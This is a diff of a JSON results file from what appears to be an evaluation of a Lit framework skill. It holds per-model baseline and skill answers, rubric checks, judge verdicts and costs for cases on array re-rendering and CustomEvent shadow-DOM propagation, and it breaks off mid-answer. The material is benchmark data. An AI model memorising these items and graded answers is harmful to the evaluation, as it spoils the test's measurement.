@@ -2,471 +2,1400 @@
   "plugin": "lit",
   "summary": {
     "n_cases": 6,
-    "expectations_met": 3,
+    "models": [
+      "sonnet",
+      "haiku",
+      "opus"
+    ],
+    "per_model": {
+      "sonnet": {
+        "n_cases": 6,
+        "expectations_met": 4,
+        "judge_wins_for_skill": 3,
+        "judge_wins_for_baseline": 0,
+        "judge_ties": 3,
+        "n_scored": 5,
+        "baseline_rubric_pass_rate": 1.0,
+        "skill_rubric_pass_rate": 1.0,
+        "rubric_delta": 0.0,
+        "cost_usd": 0.1969
+      },
+      "haiku": {
+        "n_cases": 6,
+        "expectations_met": 5,
+        "judge_wins_for_skill": 4,
+        "judge_wins_for_baseline": 1,
+        "judge_ties": 1,
+        "n_scored": 5,
+        "baseline_rubric_pass_rate": 1.0,
+        "skill_rubric_pass_rate": 1.0,
+        "rubric_delta": 0.0,
+        "cost_usd": 0.0611
+      },
+      "opus": {
+        "n_cases": 6,
+        "expectations_met": 5,
+        "judge_wins_for_skill": 4,
+        "judge_wins_for_baseline": 0,
+        "judge_ties": 2,
+        "n_scored": 5,
+        "baseline_rubric_pass_rate": 1.0,
+        "skill_rubric_pass_rate": 1.0,
+        "rubric_delta": 0.0,
+        "cost_usd": 1.1862
+      }
+    },
     "by_expectation": {
       "skill_wins": {
         "total": 4,
-        "met": 1
+        "met": {
+          "sonnet": 2,
+          "haiku": 4,
+          "opus": 3
+        }
       },
       "skill_wins_strict": {
         "total": 1,
-        "met": 1
+        "met": {
+          "sonnet": 1,
+          "haiku": 0,
+          "opus": 1
+        }
       },
       "tie": {
         "total": 1,
-        "met": 1
+        "met": {
+          "sonnet": 1,
+          "haiku": 1,
+          "opus": 1
+        }
       }
     },
-    "judge_wins_for_skill": 2,
-    "judge_wins_for_baseline": 0,
-    "judge_ties": 4,
-    "n_scored": 5,
-    "baseline_rubric_pass_rate": 1.0,
-    "skill_rubric_pass_rate": 1.0,
-    "rubric_delta": 0.0,
-    "total_cli_cost_usd": 0.4055
+    "total_cost_usd": 1.4442
   },
   "cases": [
     {
       "id": "array-mutation-no-rerender",
       "prompt": "I have a Lit component with a property `@property({type: Array}) items = []`.\nWhen I push a new item with `this.items.push(newItem)`, the\ncomponent doesn't re-render. What am I doing wrong?\n",
       "expectation": "skill_wins",
-      "expectation_met": false,
-      "baseline": {
-        "text": "# Why Your Lit Component Isn't Re-rendering\n\nThis is a very common Lit pitfall! The issue is that **Lit uses reference equality (`===`) by default to detect property changes**. When you call `this.items.push(newItem)`, you're mutating the existing array — the reference stays the same, so Lit doesn't know anything changed.\n\n## The Fix: Create a New Array Reference\n\nInstead of mutating the array, replace it with a new one:\n\n```js\n// ❌ Doesn't trigger re-render (mutation)\nthis.items.push(newItem);\n\n// ✅ Triggers re-render (new reference)\nthis.items = [...this.items, newItem];\n\n// ✅ Also works\nthis.items = this.items.concat(newItem);\n```\n\nThe same applies to other mutating methods like `pop()`, `splice()`, `sort()`, `shift()`, `unshift()`, etc. Use their immutable equivalents:\n\n```js\n// Remove an item\nthis.items = this.items.filter(item => item.id !== idToRemove);\n\n// Update an item\nthis.items = this.items.map(item =>\n  item.id === targetId ? { ...item, updated: true } : item\n);\n\n// Sort\nthis.items = [...this.items].sort();\n```\n\n## Why This Happens\n\nLit's reactive update mechanism does roughly this when you set a property:\n\n```js\nif (newValue !== oldValue) {\n  this.requestUpdate(propName, oldValue);\n}\n```\n\nFor arrays and objects, `===` compares references, not contents. Mutating in place keeps the same reference, so the check passes silently.\n\n## Alternative: Force an Update Manually\n\nIf you really need to mutate (e.g., for performance with very large arrays), you can manually request an update:\n\n```js\nthis.items.push(newItem);\nthis.requestUpdate('items');\n```\n\nHowever, the immutable approach is strongly recommended because:\n- It's predictable and easier to reason about\n- It plays well with `PureComponent`-style optimizations\n- It avoids subtle bugs when passing `items` to child components that also rely on reference equality\n\n## Bonus: Custom `hasChanged`\n\nIf you have a legitimate reason to track deep changes, you can override `hasChanged`:\n\n```js\n@property({\n  type: Array,\n  hasChanged(newVal, oldVal) {\n    return JSON.stringify(newVal) !== JSON.stringify(oldVal);\n  }\n})\nitems = [];\n```\n\nBut this is rarely the right answer — stick with immutable updates whenever possible.",
-        "cost_usd": 0.0362425,
-        "rubric": [
-          {
-            "name": "explains reference equality / strict equality",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "reference equal",
-            "why": "the actual root cause"
+      "judge_focus": "The better answer explains Lit uses reference equality (!==) for\nchange detection, recommends creating a new array\n(`this.items = [...this.items, newItem]`), and may mention\n`requestUpdate` as an alternative escape hatch.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# Lit Array Mutation Issue\n\nThe problem is that **Lit doesn't detect mutations to arrays** — it only detects when the array reference itself changes. When you `push()` to an array, you're mutating it in place, so Lit doesn't know to re-render.\n\n## Solutions\n\n### 1. **Reassign the array (Recommended)**\nCreate a new array reference:\n\n```javascript\nthis.items = [...this.items, newItem];\n// or\nthis.items = this.items.concat(newItem);\n```\n\n### 2. **Use `requestUpdate()`**\nManually trigger a re-render:\n\n```javascript\nthis.items.push(newItem);\nthis.requestUpdate();\n```\n\n### 3. **Use a reactive controller or state management**\nFor complex state, consider using a library like `lit-state` or `@lit/reactive-element`.\n\n## Why This Happens\n\nLit uses **shallow equality checks** by default. It compares the old and new property values:\n\n```javascript\noldValue === newValue  // false only if reference changes\n```\n\nWhen you mutate an array:\n```javascript\nconst arr = [1, 2];\narr.push(3);\narr === arr  // still true! Same reference\n```\n\n## Best Practice\n\nAlways treat arrays as immutable in Lit:\n\n```javascript\naddItem(newItem) {\n  this.items = [...this.items, newItem];\n}\n\nremoveItem(index) {\n  this.items = this.items.filter((_, i) => i !== index);\n}\n\nupdateItem(index, updated) {\n  this.items = this.items.map((item, i) => \n    i === index ? updated : item\n  );\n}\n```\n\nThis ensures Lit detects the change and re-renders properly.",
+            "cost_usd": 0.002177,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "!==",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "recommends creating a new array",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "[...this.items",
-            "why": "idiomatic immutable update"
+          "skill": {
+            "text": "# Array Mutation Issue in Lit\n\nYou've hit Lit's **reference-equality change detection**. When you call `this.items.push(newItem)`, you're mutating the array in place — the reference stays the same (`===`), so Lit doesn't detect a change and doesn't trigger an update.\n\n## The Fix\n\nReplace the mutation with an **immutable assignment**:\n\n```ts\n// ❌ Wrong — mutates in place, no re-render\nthis.items.push(newItem);\n\n// ✅ Correct — new reference, triggers update\nthis.items = [...this.items, newItem];\n```\n\n## Why This Happens\n\nLit uses `!==` (reference inequality) to detect property changes, not deep equality. This is intentional — it's fast and predictable. When you mutate an array or object in place, the reference doesn't change:\n\n```ts\nconst arr = [1, 2, 3];\narr.push(4);\narr === arr;  // true — same reference, Lit sees no change\n```\n\n## Common Patterns\n\n**Adding an item:**\n```ts\nthis.items = [...this.items, newItem];\n```\n\n**Removing an item:**\n```ts\nthis.items = this.items.filter(item => item.id !== idToRemove);\n```\n\n**Updating an item:**\n```ts\nthis.items = this.items.map(item =>\n  item.id === idToUpdate ? { ...item, ...updates } : item\n);\n```\n\n**Clearing the array:**\n```ts\nthis.items = [];\n```\n\n## If You Must Mutate\n\nIf you absolutely need to mutate (e.g., for performance with very large arrays), call `requestUpdate()` after the mutation to force a re-render:\n\n```ts\nthis.items.push(newItem);\nthis.requestUpdate();  // Force update\n```\n\nHowever, **avoid this pattern** — immutable updates are clearer and play better with Lit's reactivity model.\n\n## See Also\n\n- [Reactive Properties](references/reactive-properties.md) — full mutation rules and change detection details\n- [Templates & Directives](references/templates-and-directives.md) — `repeat()` directive for efficient list rendering",
+            "cost_usd": 0.006461,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "!==",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions requestUpdate as escape hatch",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "requestUpdate",
-            "why": "the escape hatch when immutability is impractical"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers cover all three rubric criteria, but Answer B is more precise and idiomatic. It correctly uses '!==' (reference inequality) terminology rather than 'shallow equality checks', frames requestUpdate as an escape hatch to avoid rather than a primary solution, and provides cleaner code examples with explicit ❌/✅ markers. Answer A calls it 'shallow equality checks' which is slightly imprecise, and presents requestUpdate more neutrally rather than as a last resort.",
+            "per_criterion": [
+              {
+                "name": "explains reference equality / strict equality",
+                "better": "skill"
+              },
+              {
+                "name": "recommends creating a new array",
+                "better": "tie"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "better": "skill"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "skill": {
-        "text": "# The Problem: Lit Doesn't Detect In-Place Mutations\n\nLit's reactivity system only triggers a re-render when a property's **reference changes**. Under the hood, Lit compares the old and new values using `===` (strict equality). When you call `this.items.push(newItem)`, you're mutating the existing array, so the reference stays the same — Lit sees no change and skips the update.\n\n## The Fix: Replace the Array with a New Reference\n\nInstead of mutating, create a new array:\n\n```js\n// ❌ Doesn't trigger a re-render\nthis.items.push(newItem);\n\n// ✅ Triggers a re-render\nthis.items = [...this.items, newItem];\n```\n\nThe same applies to other mutating operations:\n\n```js\n// Removing an item\nthis.items = this.items.filter(item => item.id !== id);\n\n// Updating an item\nthis.items = this.items.map(item =>\n  item.id === id ? { ...item, ...changes } : item\n);\n\n// Sorting (slice() first to avoid mutating the original)\nthis.items = [...this.items].sort(compareFn);\n```\n\n## Why Lit Works This Way\n\nLit deliberately avoids deep-watching objects and arrays (unlike Vue 2 or MobX) because:\n1. **Performance** — no proxies or dirty-checking on every property access.\n2. **Predictability** — you always know exactly when an update is triggered.\n3. **Immutability friendliness** — encourages patterns that play well with `repeat` directives, memoization, and shouldUpdate logic.\n\n## Escape Hatches (Use Sparingly)\n\nIf you really need to mutate in place — e.g., for performance with very large arrays — you can manually request an update:\n\n```js\nthis.items.push(newItem);\nthis.requestUpdate('items');\n```\n\nYou can also customize change detection with `hasChanged`:\n\n```js\n@property({\n  type: Array,\n  hasChanged: () => true,   // always consider it changed\n})\nitems = [];\n```\n\nBut in the vast majority of cases, **reassigning with a new array is the idiomatic Lit pattern** — it keeps your code simple, your renders predictable, and works seamlessly with directives like `repeat()` for keyed list updates.",
-        "cost_usd": 0.020954,
-        "rubric": [
-          {
-            "name": "explains reference equality / strict equality",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "strict equal",
-            "why": "the actual root cause"
+        },
+        "opus": {
+          "expectation_met": false,
+          "baseline": {
+            "text": "# The Problem\n\nLit uses **referential equality** (`===`) by default to detect property changes. When you call `this.items.push(newItem)`, you're mutating the existing array — the reference stays the same, so Lit doesn't see a change and doesn't trigger a re-render.\n\n# The Fix\n\nReplace the array with a new one instead of mutating it:\n\n```js\n// ❌ Doesn't trigger re-render\nthis.items.push(newItem);\n\n// ✅ Triggers re-render\nthis.items = [...this.items, newItem];\n```\n\nThe same applies to other mutating methods like `pop()`, `splice()`, `sort()`, etc., and to objects (`this.obj.foo = 'bar'` won't trigger an update either).\n\n# Alternative: Manual Request\n\nIf you have a good reason to mutate in place (e.g., very large arrays where copying is expensive), you can manually tell Lit to re-render:\n\n```js\nthis.items.push(newItem);\nthis.requestUpdate();\n```\n\nOr, if you want Lit to only check a specific property:\n\n```js\nthis.items.push(newItem);\nthis.requestUpdate('items');\n```\n\nNote that with `requestUpdate('items')`, the `changedProperties` map passed to `updated()` / `willUpdate()` will reflect the old value as the same reference, which can break logic that compares old vs. new.\n\n# Recommendation\n\nPrefer the immutable approach (`this.items = [...this.items, newItem]`). It plays nicely with Lit's change detection, makes `changedProperties` meaningful, and aligns with how reactive frameworks generally expect state to be updated.",
+            "cost_usd": 0.040830000000000005,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "same reference",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "recommends creating a new array",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "[...this.items",
-            "why": "idiomatic immutable update"
+          "skill": {
+            "text": "# Why Your Component Isn't Re-rendering\n\nThis is one of the most common Lit pitfalls. The issue is **how Lit detects property changes**, not anything specific to arrays.\n\n## The Cause\n\nLit uses **reference equality** (`!==`) to detect property changes. When you call `this.items.push(newItem)`, you're mutating the existing array in place — the reference stays the same, so Lit thinks nothing changed and skips the re-render.\n\n```ts\n// ❌ Mutates in place — same reference, no re-render\nthis.items.push(newItem);\n\n// Lit's check: this.items !== this.items → false → no update\n```\n\n## The Fix\n\nAlways assign a **new** array (or object) reference:\n\n```ts\n// ✅ New array reference — triggers re-render\nthis.items = [...this.items, newItem];\n```\n\nThe same rule applies to all array/object mutations:\n\n```ts\n// Add\nthis.items = [...this.items, newItem];\n\n// Remove\nthis.items = this.items.filter(item => item.id !== id);\n\n// Update one\nthis.items = this.items.map(item =>\n  item.id === id ? { ...item, done: true } : item\n);\n\n// Clear\nthis.items = [];\n```\n\nAnd for objects:\n\n```ts\n// ❌ this.user.name = 'Alice';\n// ✅\nthis.user = { ...this.user, name: 'Alice' };\n```\n\n## Escape Hatch (Use Sparingly)\n\nIf you have a genuine reason to mutate in place (e.g., a very large array where copying is too expensive), you can manually tell Lit to re-render:\n\n```ts\nthis.items.push(newItem);\nthis.requestUpdate('items', this.items); // force update\n```\n\nBut in 99% of cases, the immutable update pattern is cleaner and has no meaningful performance cost.\n\n## Why Lit Works This Way\n\nReference equality is **fast** (a single `!==` check) and **predictable**. Deep equality would be expensive on every property set, and there's no reliable way to detect mutations to nested objects without proxies. The immutable update pattern also plays nicely with `Task` arguments, `repeat()` keys, and any future migration to signals.\n\n---\n\n**TL;DR:** Replace `this.items.push(x)` with `this.items = [...this.items, x]`.",
+            "cost_usd": 0.136125,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "reference equal",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions requestUpdate as escape hatch",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "requestUpdate",
-            "why": "the escape hatch when immutability is impractical"
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers are excellent and cover all three rubric criteria clearly. Answer A provides more comprehensive examples (remove, update, clear, objects) and explains why Lit uses reference equality, while Answer B adds a useful nuance about requestUpdate('items') and changedProperties behavior. Neither is clearly superior overall.",
+            "per_criterion": [
+              {
+                "name": "explains reference equality / strict equality",
+                "better": "tie"
+              },
+              {
+                "name": "recommends creating a new array",
+                "better": "skill"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "better": "baseline"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "judge": {
-        "winner": "tie",
-        "reasoning": "Both answers are excellent and cover all three rubric criteria: reference equality explanation, new array recommendation, and requestUpdate as an escape hatch. Answer A provides slightly more depth on why Lit works this way and mentions hasChanged more cleanly, while Answer B includes a useful code snippet showing Lit's internal comparison logic and mentions concat as an alternative. Both are highly idiomatic and correct.",
-        "per_criterion": [
-          {
-            "name": "explains reference equality / strict equality",
-            "better": "tie"
+        },
+        "sonnet": {
+          "expectation_met": false,
+          "baseline": {
+            "text": "## The Problem\n\nLit tracks property changes by **reference equality** (`===`). When you use `push()`, you're mutating the **same array reference**, so Lit doesn't detect any change and skips re-rendering.\n\n```javascript\n// ❌ Mutating the array - Lit sees the same reference, no re-render\nthis.items.push(newItem);\n```\n\n---\n\n## The Fix\n\nYou need to create a **new array reference** so Lit detects the change:\n\n```javascript\n// ✅ Option 1: Spread into a new array (most common)\nthis.items = [...this.items, newItem];\n\n// ✅ Option 2: concat (returns a new array)\nthis.items = this.items.concat(newItem);\n\n// ✅ Option 3: Array.from\nthis.items = Array.from(this.items).concat(newItem);\n```\n\n---\n\n## If You *Must* Mutate\n\nIf you have a specific reason to mutate the array directly, you can notify Lit manually using `requestUpdate()`:\n\n```javascript\nthis.items.push(newItem);\nthis.requestUpdate('items', previousValue); // manually trigger re-render\n```\n\n> ⚠️ This is generally discouraged — prefer immutable updates.\n\n---\n\n## Full Example\n\n```javascript\nimport { LitElement, html } from 'lit';\n\nclass MyList extends LitElement {\n  @property({ type: Array }) items = [];\n\n  addItem(newItem) {\n    this.items = [...this.items, newItem]; // ✅ new reference = re-render\n  }\n\n  render() {\n    return html`\n      <ul>\n        ${this.items.map(item => html`<li>${item}</li>`)}\n      </ul>\n      <button @click=${() => this.addItem('New Item')}>Add</button>\n    `;\n  }\n}\n```\n\n---\n\n## Summary\n\n| Approach | Creates New Reference | Re-renders |\n|---|---|---|\n| `push()` | ❌ | ❌ |\n| `[...items, newItem]` | ✅ | ✅ |\n| `concat()` | ✅ | ✅ |\n| `push()` + `requestUpdate()` | ❌ | ✅ |\n\nThe **spread operator** (`[...this.items, newItem]`) is the cleanest and most idiomatic solution.",
+            "cost_usd": 0.009036,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "reference equal",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "recommends creating a new array",
-            "better": "tie"
+          "skill": {
+            "text": "Lit uses **reference equality** (`!==`) to detect changes. When you call `this.items.push(newItem)`, the array reference stays the same, so Lit sees no change and skips the re-render.\n\n## The Fix: Replace the Reference\n\nInstead of mutating the array, assign a new one:\n\n```typescript\n// ❌ Mutates in place — Lit sees no change\nthis.items.push(newItem);\n\n// ✅ New reference — Lit detects the change and re-renders\nthis.items = [...this.items, newItem];\n```\n\nThe same rule applies to all common array mutations:\n\n```typescript\n// ❌ All of these mutate in place\nthis.items.push(newItem);\nthis.items.pop();\nthis.items.splice(index, 1);\nthis.items.sort();\nthis.items[0] = newItem;\n\n// ✅ Immutable equivalents\nthis.items = [...this.items, newItem];           // push\nthis.items = this.items.slice(0, -1);            // pop\nthis.items = this.items.filter((_, i) => i !== index); // splice/remove\nthis.items = [...this.items].sort();             // sort\nthis.items = this.items.map((item, i) =>         // index update\n  i === 0 ? newItem : item\n);\n```\n\nThe same principle applies to **objects** — spread instead of mutating:\n\n```typescript\n// ❌ Mutates in place\nthis.user.name = 'Alice';\n\n// ✅ New reference\nthis.user = { ...this.user, name: 'Alice' };\n```\n\n## Escape Hatch: `requestUpdate()`\n\nIf you genuinely need to mutate in place (e.g., working with a third-party API that hands you a mutable object), you can manually notify Lit:\n\n```typescript\nthis.items.push(newItem);\nthis.requestUpdate('items', previousItems); // pass the old reference\n```\n\nThis works, but the immutable pattern is strongly preferred — it's clearer, easier to test, and avoids subtle bugs.\n\n## Rendering Lists Efficiently\n\nOnce your array updates correctly, use the `repeat()` directive so Lit can reconcile by key instead of re-rendering the whole list:\n\n```typescript\nimport { repeat } from 'lit/directives/repeat.js';\n\nrender() {\n  return html`\n    <ul>\n      ${repeat(\n        this.items,\n        (item) => item.id,           // stable key\n        (item) => html`<li>${item.name}</li>`\n      )}\n    </ul>\n    <button @click=${this.addItem}>Add</button>\n  `;\n}\n\nprivate addItem() {\n  this.items = [...this.items, { id: crypto.randomUUID(), name: 'New' }];\n}\n```\n\n`repeat()` with a key minimises DOM churn on reorders and insertions — without it, Lit patches nodes in place by position, which can cause issues with stateful elements like inputs.",
+            "cost_usd": 0.022551,
+            "rubric": [
+              {
+                "name": "explains reference equality / strict equality",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "reference equal",
+                "why": "the actual root cause"
+              },
+              {
+                "name": "recommends creating a new array",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "[...this.items",
+                "why": "idiomatic immutable update"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "requestUpdate",
+                "why": "the escape hatch when immutability is impractical"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions requestUpdate as escape hatch",
-            "better": "tie"
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers correctly explain reference equality, recommend creating a new array with spread syntax, and mention requestUpdate as an escape hatch. Answer A goes deeper with additional examples (other mutation methods, objects, repeat directive) while Answer B is more concise and includes a helpful summary table with multiple new-array alternatives like concat. Both are high quality and cover all rubric criteria equally well.",
+            "per_criterion": [
+              {
+                "name": "explains reference equality / strict equality",
+                "better": "tie"
+              },
+              {
+                "name": "recommends creating a new array",
+                "better": "tie"
+              },
+              {
+                "name": "mentions requestUpdate as escape hatch",
+                "better": "tie"
+              }
+            ]
           }
-        ]
+        }
       }
     },
     {
       "id": "typed-event-cross-shadow",
       "prompt": "I'm dispatching a CustomEvent from inside my Lit component, but\nthe parent component listening for it isn't receiving the event.\nThe parent is just outside the host element. What's wrong?\n",
       "expectation": "skill_wins",
-      "expectation_met": false,
-      "baseline": {
-        "text": "# CustomEvents from Lit Components Not Reaching Parent\n\nThis is one of the most common gotchas in Lit (and web components in general). By default, `CustomEvent` does **not** bubble, and even if you make it bubble, it won't cross the shadow DOM boundary unless you explicitly tell it to.\n\n## The Fix\n\nYou need to set both `bubbles: true` and `composed: true` when constructing the event:\n\n```js\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { value: 42 },\n  bubbles: true,\n  composed: true,\n}));\n```\n\n## Why Both Are Needed\n\n| Option | What it does |\n|---|---|\n| `bubbles: true` | Allows the event to propagate up the DOM tree (instead of firing only on the target). |\n| `composed: true` | Allows the event to cross shadow DOM boundaries into the light DOM where the parent lives. |\n\nWithout `composed: true`, the event will bubble *within* your component's shadow root and then stop at the shadow boundary — so any listener on the host element or above it will never see it.\n\n## Quick Sanity Checks\n\nIf it still doesn't work after adding those flags, verify:\n\n1. **Event name match** — Listener name must match exactly (e.g. `@my-event` in a Lit parent template, or `addEventListener('my-event', ...)`).\n2. **Listener attached early enough** — If you're attaching imperatively, make sure the child element exists in the DOM before you attach.\n3. **Not stopped en route** — Check that no intermediate element calls `stopPropagation()` or `stopImmediatePropagation()`.\n4. **Custom event naming** — Lit convention is to use lowercase, hyphenated names (`item-selected`, not `itemSelected`) since DOM event names are case-insensitive in HTML attributes.\n\n## Recommended Pattern\n\nWrap dispatching in a small helper to avoid forgetting the flags:\n\n```js\nprivate _emit<T>(name: string, detail?: T) {\n  this.dispatchEvent(new CustomEvent<T>(name, {\n    detail,\n    bubbles: true,\n    composed: true,\n  }));\n}\n```\n\nThen call `this._emit('item-selected', { id })` wherever you need to notify the outside world.\n\nAdd `{ bubbles: true, composed: true }` and the parent should start receiving the event immediately.",
-        "cost_usd": 0.037017,
-        "rubric": [
-          {
-            "name": "identifies composed:true is required",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "composed: true",
-            "why": "the specific knob"
+      "judge_focus": "The better answer pinpoints `composed: true` (and bubbles: true) as\nrequired to cross Shadow DOM boundaries. Bonus for mentioning typed\nEvent subclasses with static readonly type.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# CustomEvent Not Reaching Parent in Lit\n\nThe issue is likely that your CustomEvent is **not crossing the Shadow DOM boundary**. By default, events created in Shadow DOM don't bubble out to the light DOM.\n\n## Solution: Set `composed: true`\n\nWhen dispatching the event, add the `composed` option:\n\n```javascript\n// ❌ Won't reach parent (default)\nthis.dispatchEvent(new CustomEvent('my-event'));\n\n// ✅ Will reach parent\nthis.dispatchEvent(new CustomEvent('my-event', {\n  bubbles: true,\n  composed: true\n}));\n```\n\n## Complete Example\n\n**Child Component (Lit):**\n```javascript\nimport { LitElement, html } from 'lit';\n\nexport class MyChild extends LitElement {\n  handleClick() {\n    this.dispatchEvent(new CustomEvent('child-event', {\n      detail: { message: 'Hello from child' },\n      bubbles: true,\n      composed: true  // ← This is the key!\n    }));\n  }\n\n  render() {\n    return html`<button @click=${this.handleClick}>Click me</button>`;\n  }\n}\n```\n\n**Parent Component:**\n```javascript\nexport class MyParent extends LitElement {\n  handleChildEvent(e) {\n    console.log('Received:', e.detail.message);\n  }\n\n  render() {\n    return html`\n      <my-child @child-event=${this.handleChildEvent}></my-child>\n    `;\n  }\n}\n```\n\n## Key Options Explained\n\n| Option | Purpose |\n|--------|---------|\n| `bubbles: true` | Allows event to bubble up the DOM tree |\n| `composed: true` | **Allows event to cross Shadow DOM boundary** |\n| `detail` | Optional data to pass with the event |\n\nBoth `bubbles` and `composed` are typically needed for events to reach parents outside the Shadow DOM.",
+            "cost_usd": 0.002379,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM boundary",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions bubbles:true",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "bubbles: true",
-            "why": "usually paired with composed for upward propagation"
+          "skill": {
+            "text": "# CustomEvent Not Crossing Shadow DOM Boundary\n\nThe issue is that your event isn't configured to bubble through the Shadow DOM. By default, events created with `new CustomEvent()` have `bubbles: false` and `composed: false`, which means they stop at the Shadow DOM boundary.\n\n## Solution\n\nWhen dispatching a custom event from a Lit component, **always set `bubbles: true` and `composed: true`**:\n\n```typescript\nimport { LitElement, html } from 'lit';\nimport { customElement } from 'lit/decorators.js';\n\n@customElement('my-button')\nexport class MyButton extends LitElement {\n  private handleClick() {\n    // ✅ Correct: event crosses Shadow DOM\n    this.dispatchEvent(\n      new CustomEvent('my-event', {\n        detail: { message: 'Hello from shadow!' },\n        bubbles: true,\n        composed: true,\n      })\n    );\n  }\n\n  render() {\n    return html`<button @click=${this.handleClick}>Click me</button>`;\n  }\n}\n```\n\nParent listening outside the component:\n\n```typescript\nconst button = document.querySelector('my-button');\nbutton.addEventListener('my-event', (e: Event) => {\n  const event = e as CustomEvent;\n  console.log(event.detail.message); // \"Hello from shadow!\"\n});\n```\n\n## Why This Matters\n\n| Property | Effect |\n|----------|--------|\n| `bubbles: true` | Event propagates up the DOM tree (parent, grandparent, etc.) |\n| `composed: true` | Event crosses the Shadow DOM boundary; without this, it stops at the host element |\n| `bubbles: false` (default) | Event only fires on the exact target; doesn't propagate |\n| `composed: false` (default) | Event cannot cross Shadow DOM; invisible to light DOM listeners |\n\n## Best Practice: Typed Event Classes\n\nFor type safety and reusability, define a concrete event class:\n\n```typescript\n// events.ts\nexport class MyEventDetail {\n  constructor(public message: string) {}\n}\n\nexport class MyEvent extends Event {\n  static readonly type = 'my-event';\n\n  constructor(public detail: MyEventDetail) {\n    super(MyEvent.type, { bubbles: true, composed: true });\n  }\n}\n\n// my-button.ts\nimport { MyEvent, MyEventDetail } from './events.js';\n\n@customElement('my-button')\nexport class MyButton extends LitElement {\n  private handleClick() {\n    this.dispatchEvent(new MyEvent(new MyEventDetail('Hello!')));\n  }\n\n  render() {\n    return html`<button @click=${this.handleClick}>Click me</button>`;\n  }\n}\n\n// parent.ts\nimport { MyEvent } from './events.js';\n\nconst button = document.querySelector('my-button')!;\nbutton.addEventListener(MyEvent.type, (e: Event) => {\n  const event = e as MyEvent;\n  console.log(event.detail.message); // Fully typed!\n});\n```\n\n## Dispatch After `updateComplete`\n\nFor events that reflect the rendered state, dispatch after the DOM has updated:\n\n```typescript\nprivate async handleChange() {\n  this.value = 'new value';\n  await this.updateComplete; // Wait for render\n  this.dispatchEvent(\n    new CustomEvent('value-changed', 